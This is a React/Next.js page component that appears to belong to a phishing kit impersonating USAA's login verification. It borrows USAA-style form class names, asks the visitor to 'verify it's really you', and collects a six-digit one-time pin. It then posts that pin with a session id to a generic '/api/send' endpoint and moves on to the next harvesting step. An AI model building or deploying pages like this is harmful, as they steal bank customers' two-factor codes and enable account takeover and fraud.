import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { Wrapper } from "../components/Wrapper";
import { Input } from "../components/Input";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";

interface EmailProps { }

const schema = yup.object().shape({
  otp: yup
    .number()
    .typeError(`Enter a valid one time pin`)
    .required(`Enter the one time pin we sent you`)
    .test(
      `len`,
      `Enter a valid one time pin`,
      (val: any) => !!(val && val.toString().length === 6)
    ),
});

export const Email: React.FC<EmailProps> = ({ }) => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `OTP`);
    formData.append(
      `otp`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      otp: data,
    });

    const url = getProgress()[getProgress().indexOf(`OTP`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper
      title="Now, let's verify it's really you."
      loading={loading}
      isValid={isValid}
      onSubmit={onSubmit}
      subTitle={`Please Verify Your Login`}
      errors={errors}
    >
      <div className="usaa-form-v5-10-1-formGroup-wrapper">
        <div className="usaa-form-v5-10-1-formGroup">
          <Input
            label={`One Time Pin`}
            name={`otp`}
            register={register}
            error={errors.otp && (errors.otp.message as unknown as string)}
          />
        </div>
      </div>
    </Wrapper>
  );
};

export default Email;
